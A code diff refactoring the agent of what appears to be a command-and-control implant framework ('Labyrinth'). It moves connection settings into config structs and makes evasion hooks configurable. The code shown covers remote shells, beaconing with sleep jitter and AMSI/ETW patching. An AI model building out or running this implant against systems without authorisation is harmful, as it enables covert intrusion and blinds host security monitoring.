@@ -1,7 +1,8 @@
-use crate::agent::connection::ConnectionManager;
+use crate::agent::connection::{ConnectionManager, ControlConnectionConfig};
 // reverse_port_forward: background response channel utilities
 
 use crate::agent::command_executor::{CommandExecutor, OSDetector};
+use crate::agent::evasion::{EvasionHook, EvasionManager};
 use crate::agent::pty_shell::PtyShellManager;
 use crate::agent::system_info::SystemInfoCollector;
 use crate::error::{LabyrinthError, Result};
@@ -46,6 +47,19 @@ pub struct DwellerRunConfig {
 }
 
 #[derive(Debug, Clone)]
+pub struct AgentRunConfig {
+    pub server_addr: String,
+    pub server_cert_b64: Option<String>,
+    pub accept_fingerprint: Option<String>,
+    pub proxy: Option<String>,
+    pub transport: TransportMode,
+    pub retry: bool,
+    pub sni: Option<String>,
+    pub alpn: Vec<String>,
+    pub evasion_hooks: Vec<EvasionHook>,
+}
+
+#[derive(Debug, Clone)]
 struct DwellerRuntimeContext {
     dweller_id: String,
     listen_addr: String,
@@ -64,24 +78,16 @@ struct DwellerCallbackSupervisor {
 }
 
 impl AgentCore {
-    pub async fn run_agent(
-        server_addr: &str,
-        server_cert_b64: Option<String>,
-        accept_fingerprint: Option<String>,
-        proxy: Option<String>,
-        transport: TransportMode,
-        retry: bool,
-        sni: Option<String>,
-        alpn: Vec<String>,
-    ) -> Result<()> {
+    pub async fn run_agent(config: AgentRunConfig) -> Result<()> {
         info!("{} Starting Labyrinth agent...", styling::SUCCESS_INDICATOR);
 
-        // Apply evasion hooks (AMSI/ETW patching on Windows)
-        crate::agent::evasion::EvasionManager::apply_evasion_hooks();
+        EvasionManager::apply_evasion_hooks(&config.evasion_hooks)?;
 
-        let agent_info =
-            SystemInfoCollector::get_system_info_for_server(Some(server_addr), proxy.is_none())
-                .await;
+        let agent_info = SystemInfoCollector::get_system_info_for_server(
+            Some(&config.server_addr),
+            config.proxy.is_none(),
+        )
+        .await;
         info!(
             "{} Agent info: {} on {}/{}",
             styling::SUCCESS_INDICATOR,
@@ -90,49 +96,22 @@ impl AgentCore {
             agent_info.arch
         );
 
-        Self::run_registered_client(
-            agent_info,
-            server_addr,
-            server_cert_b64,
-            accept_fingerprint,
-            proxy,
-            transport,
-            retry,
-            sni,
-            alpn,
-        )
-        .await
+        Self::run_registered_client(agent_info, config.into()).await
     }
 
     async fn run_registered_client(
         agent_info: AgentInfo,
-        server_addr: &str,
-        server_cert_b64: Option<String>,
-        accept_fingerprint: Option<String>,
-        proxy: Option<String>,
-        transport: TransportMode,
-        retry: bool,
-        sni: Option<String>,
-        alpn: Vec<String>,
+        connection_config: ControlConnectionConfig,
     ) -> Result<()> {
         loop {
             // Establish control connection to server
             let control_connection =
-                match ConnectionManager::establish_control_connection_with_retry(
-                    server_addr,
-                    server_cert_b64.clone(),
-                    accept_fingerprint.clone(),
-                    proxy.clone(),
-                    transport,
-                    retry,
-                    sni.clone(),
-                    alpn.clone(),
-                )
-                .await
+                match ConnectionManager::establish_control_connection_with_retry(&connection_config)
+                    .await
                 {
                     Ok(stream) => stream,
                     Err(e) => {
-                        if retry {
+                        if connection_config.retry {
                             sleep(Duration::from_secs(5)).await;
                             continue;
                         } else {
@@ -152,7 +131,7 @@ impl AgentCore {
                     styling::ERROR_INDICATOR,
                     e
                 );
-                if retry {
+                if connection_config.retry {
                     sleep(Duration::from_secs(5)).await;
                     continue;
                 } else {
@@ -166,7 +145,7 @@ impl AgentCore {
                     styling::ERROR_INDICATOR,
                     e
                 );
-                if retry {
+                if connection_config.retry {
                     sleep(Duration::from_secs(5)).await;
                     continue;
                 } else {
@@ -187,7 +166,7 @@ impl AgentCore {
                                 styling::ERROR_INDICATOR,
                                 e
                             );
-                            if retry {
+                            if connection_config.retry {
                                 sleep(Duration::from_secs(5)).await;
                                 continue;
                             } else {
@@ -209,7 +188,7 @@ impl AgentCore {
                                 styling::ERROR_INDICATOR,
                                 response
                             );
-                            if retry {
+                            if connection_config.retry {
                                 sleep(Duration::from_secs(5)).await;
                                 continue;
                             } else {
@@ -226,7 +205,7 @@ impl AgentCore {
                         styling::ERROR_INDICATOR,
                         e
                     );
-                    if retry {
+                    if connection_config.retry {
                         sleep(Duration::from_secs(5)).await;
                         continue;
                     } else {
@@ -249,7 +228,7 @@ impl AgentCore {
 
             Self::run_control_loop(reader, &mut control_writer).await;
 
-            if !retry {
+            if !connection_config.retry {
                 break;
             }
 
@@ -380,7 +359,7 @@ impl AgentCore {
             if callback.address.trim().is_empty() {
                 continue;
             }
-            let key = format!("{}|{}", callback.address, callback.transport);
+            let key = Self::callback_key(&callback);
             if seen.insert(key) {
                 deduped.push(callback);
             }
@@ -451,7 +430,13 @@ impl AgentCore {
     }
 
     fn callback_key(callback: &DwellerServerEndpoint) -> String {
-        format!("{}|{}", callback.address, callback.transport)
+        format!(
+            "{}|{}|{}|{}",
+            callback.address,
+            callback.transport,
+            callback.sni.clone().unwrap_or_default(),
+            callback.alpn.join(",")
+        )
     }
 
     fn callback_signature(
@@ -459,10 +444,12 @@ impl AgentCore {
         hibernation: &DwellerHibernationConfig,
     ) -> String {
         format!(
-            "{}|{}|{}|{}|{}|{}|{}",
+            "{}|{}|{}|{}|{}|{}|{}|{}|{}",
             callback.address,
             callback.transport,
             callback.fingerprint.clone().unwrap_or_default(),
+            callback.sni.clone().unwrap_or_default(),
+            callback.alpn.join(","),
             hibernation.enabled,
             hibernation.sleep_seconds,
             hibernation.jitter_percent,
@@ -520,14 +507,16 @@ impl AgentCore {
         }
         Self::run_registered_client(
             info,
-            &endpoint.address,
-            None,
-            endpoint.fingerprint,
-            None,
-            transport,
-            true,
-            endpoint.sni,
-            endpoint.alpn,
+            ControlConnectionConfig {
+                server_addr: endpoint.address,
+                server_cert_b64: None,
+                accept_fingerprint: endpoint.fingerprint,
+                proxy: None,
+                transport,
+                retry: true,
+                sni: endpoint.sni,
+                alpn: endpoint.alpn,
+            },
         )
         .await
     }
@@ -573,17 +562,18 @@ impl AgentCore {
         transport: TransportMode,
         hibernation: &DwellerHibernationConfig,
     ) -> Result<usize> {
-        let control_connection = ConnectionManager::establish_control_connection_with_retry(
-            &endpoint.address,
-            None,
-            endpoint.fingerprint.clone(),
-            None,
-            transport,
-            false,
-            endpoint.sni.clone(),
-            endpoint.alpn.clone(),
-        )
-        .await?;
+        let control_connection =
+            ConnectionManager::establish_control_connection_with_retry(&ControlConnectionConfig {
+                server_addr: endpoint.address.clone(),
+                server_cert_b64: None,
+                accept_fingerprint: endpoint.fingerprint.clone(),
+                proxy: None,
+                transport,
+                retry: false,
+                sni: endpoint.sni.clone(),
+                alpn: endpoint.alpn.clone(),
+            })
+            .await?;
         let mut control_stream = control_connection.stream;
         Self::write_message(
             &mut control_stream,
@@ -1682,27 +1672,23 @@ impl AgentCore {
 
     // Removed unused reverse port forward helpers; streaming handles data plane
 }
-pub async fn run_agent(
-    server_addr: &str,
-    server_cert_b64: Option<String>,
-    accept_fingerprint: Option<String>,
-    proxy: Option<String>,
-    transport: TransportMode,
-    retry: bool,
-    sni: Option<String>,
-    alpn: Vec<String>,
-) -> Result<()> {
-    AgentCore::run_agent(
-        server_addr,
-        server_cert_b64,
-        accept_fingerprint,
-        proxy,
-        transport,
-        retry,
-        sni,
-        alpn,
-    )
-    .await
+impl From<AgentRunConfig> for ControlConnectionConfig {
+    fn from(config: AgentRunConfig) -> Self {
+        Self {
+            server_addr: config.server_addr,
+            server_cert_b64: config.server_cert_b64,
+            accept_fingerprint: config.accept_fingerprint,
+            proxy: config.proxy,
+            transport: config.transport,
+            retry: config.retry,
+            sni: config.sni,
+            alpn: config.alpn,
+        }
+    }
+}
+
+pub async fn run_agent(config: AgentRunConfig) -> Result<()> {
+    AgentCore::run_agent(config).await
 }
 
 pub async fn run_dweller(config: DwellerRunConfig) -> Result<()> {
